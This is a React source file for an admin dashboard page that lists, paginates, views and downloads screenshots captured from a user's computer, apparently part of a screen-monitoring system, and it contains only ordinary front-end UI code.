// admin-dashboard/src/pages/ScreenshotsPage.jsx
import React, { useEffect, useState } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import axios from 'axios';

const SERVER_URL = import.meta.env.VITE_SERVER_URL || "http://103.130.11.114:3001";

function ScreenshotsPage() {
  const { userId } = useParams();
  const navigate = useNavigate();
  const [user, setUser] = useState(null);
  const [screenshots, setScreenshots] = useState([]);
  const [loading, setLoading] = useState(true);
  const [selectedScreenshot, setSelectedScreenshot] = useState(null);
  const [viewingImage, setViewingImage] = useState(null);
  const [hasMore, setHasMore] = useState(false);
  const [skip, setSkip] = useState(0);
  const limit = 24;

  useEffect(() => {
    fetchUser();
    fetchScreenshots();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [userId]);

  const fetchUser = async () => {
    try {
      const response = await axios.get(`${SERVER_URL}/api/users`);
      if (response.data.success) {
        const foundUser = response.data.users.find(u => u._id === userId);
        setUser(foundUser);
      }
    } catch (error) {
      console.error('Error fetching user:', error);
    }
  };

  const fetchScreenshots = async (skipCount = 0) => {
    try {
      setLoading(true);
      const response = await axios.get(
        `${SERVER_URL}/api/screenshots/${userId}?limit=${limit}&skip=${skipCount}`
      );

      if (response.data.success) {
        if (skipCount === 0) {
          setScreenshots(response.data.screenshots);
        } else {
          setScreenshots(prev => [...prev, ...response.data.screenshots]);
        }
        setHasMore(response.data.hasMore);
        setSkip(skipCount + response.data.screenshots.length);
      }
    } catch (error) {
      console.error('Failed to fetch screenshots:', error);
    } finally {
      setLoading(false);
    }
  };

  const loadMore = () => {
    fetchScreenshots(skip);
  };

  const viewScreenshot = async (screenshot) => {
    try {
      setSelectedScreenshot(screenshot);
      setViewingImage(null);

      const response = await axios.get(
        `${SERVER_URL}/api/screenshots/image/${screenshot._id}`
      );

      if (response.data.success) {
        setViewingImage(response.data.screenshot.imageData);
      }
    } catch (error) {
      console.error('Failed to load screenshot image:', error);
    }
  };

  const closeViewer = () => {
    setSelectedScreenshot(null);
    setViewingImage(null);
  };

  const formatDate = (dateString) => {
    const date = new Date(dateString);
    return date.toLocaleString();
  };

  const downloadScreenshot = () => {
    if (!viewingImage) return;

    const link = document.createElement('a');
    link.href = viewingImage;
    link.download = `screenshot-${user?.username}-${new Date(selectedScreenshot.timestamp).getTime()}.jpg`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  return (
    <div className="min-h-screen bg-light">
      {/* Header */}
      <div className="bg-white shadow-sm border-b border-gray-200 sticky top-0 z-10">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex items-center justify-between h-16">
            <button
              onClick={() => navigate(`/user/${userId}`)}
              className="flex items-center space-x-2 text-gray-600 hover:text-gray-900 transition-colors"
            >
              <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
              </svg>
              <span>Back to User</span>
            </button>
            
            <div className="flex items-center space-x-3">
              <svg className="w-6 h-6 text-secondary" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z" />
              </svg>
              <div>
                <h1 className="text-lg font-bold text-gray-900">Screenshots</h1>
                <p className="text-xs text-gray-600">{user?.username || 'Loading...'}</p>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        {/* Stats */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
          <div className="bg-white border border-gray-200 rounded-xl p-6">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-gray-600 text-sm mb-1">Total Screenshots</p>
                <p className="text-3xl font-bold text-gray-900">{screenshots.length + (hasMore ? '+' : '')}</p>
              </div>
              <div className="w-12 h-12 bg-secondary/20 rounded-lg flex items-center justify-center">
                <svg className="w-7 h-7 text-secondary" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z" />
                </svg>
              </div>
            </div>
          </div>

          <div className="bg-white border border-gray-200 rounded-xl p-6">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-gray-600 text-sm mb-1">Latest Capture</p>
                <p className="text-sm font-medium text-gray-900">
                  {screenshots.length > 0 
                    ? new Date(screenshots[0].timestamp).toLocaleDateString()
                    : 'N/A'}
                </p>
              </div>
              <div className="w-12 h-12 bg-primary/20 rounded-lg flex items-center justify-center">
                <svg className="w-7 h-7 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
                </svg>
              </div>
            </div>
          </div>

          <div className="bg-white border border-gray-200 rounded-xl p-6">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-gray-600 text-sm mb-1">Device</p>
                <p className="text-sm font-medium text-gray-900 truncate">
                  {screenshots.length > 0 
                    ? screenshots[0].computerName 
                    : 'N/A'}
                </p>
              </div>
              <div className="w-12 h-12 bg-blue-500/20 rounded-lg flex items-center justify-center">
                <svg className="w-7 h-7 text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
                </svg>
              </div>
            </div>
          </div>
        </div>

        {/* Screenshots Grid */}
        {loading && screenshots.length === 0 ? (
          <div className="flex items-center justify-center py-20">
            <div className="animate-spin rounded-full h-12 w-12 border-4 border-primary border-t-transparent"></div>
          </div>
        ) : screenshots.length === 0 ? (
          <div className="text-center py-20">
            <svg className="w-16 h-16 text-gray-400 mx-auto mb-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z" />
            </svg>
            <p className="text-gray-600 text-lg">No screenshots available</p>
          </div>
        ) : (
          <>
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4">
              {screenshots.map((screenshot) => (
                <div
                  key={screenshot._id}
                  onClick={() => viewScreenshot(screenshot)}
                  className="group bg-white border border-gray-200 rounded-xl overflow-hidden cursor-pointer hover:scale-[1.02] hover:shadow-xl hover:shadow-primary/20 transition-all duration-200"
                >
                  <div className="aspect-video bg-gray-100 flex items-center justify-center relative overflow-hidden">
                    <svg className="w-12 h-12 text-gray-400 group-hover:text-primary transition-colors" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z" />
                    </svg>
                  </div>
                  <div className="p-3">
                    <p className="text-gray-900 text-sm font-medium mb-1">
                      {new Date(screenshot.timestamp).toLocaleDateString()}
                    </p>
                    <p className="text-gray-600 text-xs">
                      {new Date(screenshot.timestamp).toLocaleTimeString()}
                    </p>
                    <p className="text-gray-500 text-xs mt-1 truncate">
                      {screenshot.computerName}
                    </p>
                  </div>
                </div>
              ))}
            </div>

            {hasMore && (
              <div className="mt-8 text-center">
                <button
                  onClick={loadMore}
                  disabled={loading}
                  className="px-8 py-3 bg-primary hover:bg-primary/80 disabled:bg-gray-400 disabled:cursor-not-allowed text-white rounded-lg font-medium transition-colors inline-flex items-center space-x-2"
                >
                  {loading ? (
                    <>
                      <div className="animate-spin rounded-full h-5 w-5 border-2 border-white border-t-transparent"></div>
                      <span>Loading...</span>
                    </>
                  ) : (
                    <>
                      <span>Load More</span>
                      <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
                      </svg>
                    </>
                  )}
                </button>
              </div>
            )}
          </>
        )}
      </div>

      {/* Screenshot Viewer Modal */}
      {selectedScreenshot && (
        <div 
          className="fixed inset-0 z-50 bg-black/90 backdrop-blur-sm flex items-center justify-center p-4"
          onClick={closeViewer}
        >
          <div 
            className="bg-white border border-gray-200 rounded-xl max-w-6xl w-full max-h-[90vh] flex flex-col"
            onClick={(e) => e.stopPropagation()}
          >
            {/* Viewer Header */}
            <div className="flex items-center justify-between p-4 border-b border-gray-200">
              <div>
                <h3 className="text-gray-900 font-semibold">{user?.username}</h3>
                <p className="text-gray-600 text-sm">{formatDate(selectedScreenshot.timestamp)}</p>
              </div>
              <div className="flex items-center space-x-2">
                {viewingImage && (
                  <button
                    onClick={downloadScreenshot}
                    className="px-4 py-2 bg-secondary hover:bg-secondary/80 text-white rounded-lg transition-colors flex items-center space-x-2"
                  >
                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" />
                    </svg>
                    <span>Download</span>
                  </button>
                )}
                <button
                  onClick={closeViewer}
                  className="p-2 hover:bg-gray-100 text-gray-600 hover:text-gray-900 rounded-lg transition-colors"
                >
                  <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                  </svg>
                </button>
              </div>
            </div>

            {/* Viewer Content */}
            <div className="flex-1 overflow-auto p-4">
              {!viewingImage ? (
                <div className="flex items-center justify-center h-full">
                  <div className="text-center">
                    <div className="animate-spin rounded-full h-12 w-12 border-4 border-primary border-t-transparent mx-auto mb-4"></div>
                    <p className="text-gray-600">Loading image...</p>
                  </div>
                </div>
              ) : (
                <img
                  src={viewingImage}
                  alt="Screenshot"
                  className="w-full h-full object-contain rounded-lg"
                />
              )}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

export default ScreenshotsPage;
